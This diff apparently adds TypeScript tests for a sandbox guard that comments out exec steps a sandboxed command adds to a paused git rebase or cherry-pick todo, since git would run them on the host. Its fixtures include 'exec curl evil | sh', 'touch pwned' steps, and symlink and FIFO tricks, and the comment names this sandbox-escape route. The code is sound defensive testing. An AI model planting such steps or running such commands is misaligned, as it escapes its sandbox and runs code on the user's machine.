@@ -1,4 +1,5 @@
-import { chmodSync, linkSync, mkdirSync, mkdtempSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import { chmodSync, linkSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
 
@@ -530,5 +531,103 @@ describe("a look that could neither record nor tell its protected keys", () => {
         message: "Blocked: the computer could not record this folder's state, so commands cannot run here: disk Blocked: the computer could not check this folder's protected paths, so commands cannot run here: full",
       },
     });
+  });
+});
+
+// Git runs a paused rebase's or cherry-pick's exec steps outside the sandbox, at the host's
+// git rebase --continue: the guest's rule lets commands write git's transient state.
+describe("a paused rebase's or cherry-pick's todo", () => {
+  const output = async (guard: HookGuard) => ((await guard.after(ran(""))) as { ok: { output: string } }).ok.output;
+
+  it("comments out exec lines a command added to a rebase todo, keeping the user's", async () => {
+    // Baseline recorded at command start: one user exec line.
+    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
+    mkdirSync(dirname(todo), { recursive: true });
+    writeFileSync(todo, "pick abc one\nexec make test\n");
+    const guard = new HookGuard(folder);
+    await guard.refusal();                       // records the exec lines present now
+    writeFileSync(todo, "pick abc one\nexec make test\nexec curl evil | sh\n"); // a command adds one
+    const notice = await output(guard);
+    const after = readFileSync(todo, "utf8");
+    expect(after).toContain("exec make test");                       // the user's line kept
+    expect(after).toContain("# Surogate removed a step a command added: exec curl evil | sh");
+    expect(after).not.toMatch(/^exec curl evil \| sh$/m);            // the added line neutralised
+    expect(notice).toMatch(/removed a step/);
+  });
+
+  it("keeps the exec lines of the user's own rebase -x, started on the host, that are there at the next command's start", async () => {
+    mkdirSync(join(folder, ".git"));
+    const guard = new HookGuard(folder);
+    await guard.refusal();
+    expect(await output(guard)).toBe("");
+    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
+    mkdirSync(dirname(todo));
+    writeFileSync(todo, "pick abc one\nexec make test\npick def two\nx make test\n");
+    await guard.refusal();
+    expect(await output(guard)).toBe("");
+    await guard.watch();
+    expect(readFileSync(todo, "utf8")).toBe("pick abc one\nexec make test\npick def two\nx make test\n");
+  });
+
+  it("comments out every exec line of a todo a command began, in a submodule's git folder too, and tells a look between commands with the next output", async () => {
+    const lib = join(folder, ".git/modules/lib");
+    mkdirSync(join(lib, "sequencer"), { recursive: true });
+    writeFileSync(join(lib, "HEAD"), "ref: refs/heads/main\n");
+    const guard = new HookGuard(folder);
+    await guard.refusal();
+    const todo = join(lib, "sequencer/todo");
+    writeFileSync(todo, "pick abc one\n\t x  touch pwned\r\nexecute\n");
+    await guard.watch();
+    expect(readFileSync(todo, "utf8")).toBe("pick abc one\n# Surogate removed a step a command added: \t x  touch pwned\r\nexecute\n");
+    expect(await output(guard)).toMatch(/removed a step.*\.git\/modules\/lib\/sequencer\/todo$/);
+    expect(await output(guard)).toBe("");
+  });
+
+  it("comments out a step added between commands while something of the chat's could have added it, though it is there at the next command's start", async () => {
+    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
+    mkdirSync(dirname(todo), { recursive: true });
+    writeFileSync(todo, "exec make test\n");
+    const guard = new HookGuard(folder, { writing: () => true });
+    await guard.refusal();
+    writeFileSync(todo, "exec make test\nexec touch pwned\n");
+    await guard.refusal();
+    await guard.after(ran(""));
+    expect(readFileSync(todo, "utf8")).toBe("exec make test\n# Surogate removed a step a command added: exec touch pwned\n");
+  });
+
+  it("after a crash, comments out every exec line before any command", async () => {
+    const todo = join(folder, ".git/rebase-merge/git-rebase-todo");
+    mkdirSync(dirname(todo), { recursive: true });
+    writeFileSync(todo, "exec touch pwned\n");
+    expect(await new HookGuard(folder, { inherited: new Map() }).refusal()).toBeNull();
+    expect(readFileSync(todo, "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
+  });
+
+  it("replaces a todo linked to a file in the folder as a file, leaving the file, and refuses commands while one it cannot change or read is there", async () => {
+    const merge = join(folder, ".git/rebase-merge");
+    mkdirSync(merge, { recursive: true });
+    const guard = new HookGuard(folder);
+    await guard.refusal();
+    writeFileSync(join(folder, "notes.txt"), "exec touch pwned\n");
+    symlinkSync("../../notes.txt", join(merge, "git-rebase-todo"));
+    await guard.after(ran(""));
+    expect(readFileSync(join(merge, "git-rebase-todo"), "utf8")).toBe("# Surogate removed a step a command added: exec touch pwned\n");
+    expect(readFileSync(join(folder, "notes.txt"), "utf8")).toBe("exec touch pwned\n");
+    // Its folder leads out of the folder, where the guard writes nothing.
+    rmSync(merge, { recursive: true });
+    mkdirSync(join(other, "merge"));
+    writeFileSync(join(other, "merge", "git-rebase-todo"), "exec touch pwned\n");
+    symlinkSync(join(other, "merge"), merge);
+    await guard.after(ran(""));
+    expect(await guard.refusal()).toEqual({ error: { type: "sandbox", message: "Blocked: the computer could not remove the steps a command added to .git/rebase-merge/git-rebase-todo, which git would run outside the sandbox. Abort that rebase or cherry-pick, or remove those exec lines, to run commands here." } });
+    expect(readFileSync(join(other, "merge", "git-rebase-todo"), "utf8")).toBe("exec touch pwned\n");
+    // A FIFO git would wait on, which a process could feed.
+    rmSync(merge);
+    mkdirSync(merge);
+    spawnSync("mkfifo", [join(merge, "git-rebase-todo")]);
+    await guard.after(ran(""));
+    expect(await guard.refusal()).toMatchObject({ error: { message: expect.stringContaining("could not remove the steps") } });
+    rmSync(merge, { recursive: true });
+    expect(await guard.refusal()).toBeNull();
   });
 });
